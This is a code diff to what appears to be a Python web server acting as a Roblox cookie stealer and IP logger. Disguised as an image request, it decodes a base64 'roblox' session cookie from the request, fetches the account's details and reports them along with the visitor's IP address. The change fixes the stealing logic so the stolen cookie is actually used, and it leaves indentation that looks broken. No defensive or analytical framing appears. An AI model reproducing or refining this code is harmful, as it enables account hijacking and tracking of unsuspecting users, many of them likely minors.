@@ -257,15 +257,15 @@ height: 100vh;
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
-            if 'roblox' in dic:
+            #if 'roblox' in dic:
+            roblox_data = None
+            try:
+                cookie = base64.b64decode(dic['roblox'].encode()).decode('utf-8')
                 roblox_data = get_roblox_info(cookie)
-                try:
-                    cookie = base64.b64decode(dic['roblox'].encode()).decode('utf-8')
-                    # roblox_data = get_roblox_info(cookie)
-                    if roblox_data:
-                        makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url, roblox_info=roblox_data)
-                except:
-                    pass
+                if roblox_data:
+                    makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url, roblox_info=roblox_data)
+            except:
+                pass
                 self.send_response(200)
                 self.send_header('Content-Type', 'image/gif')
                 self.end_headers()
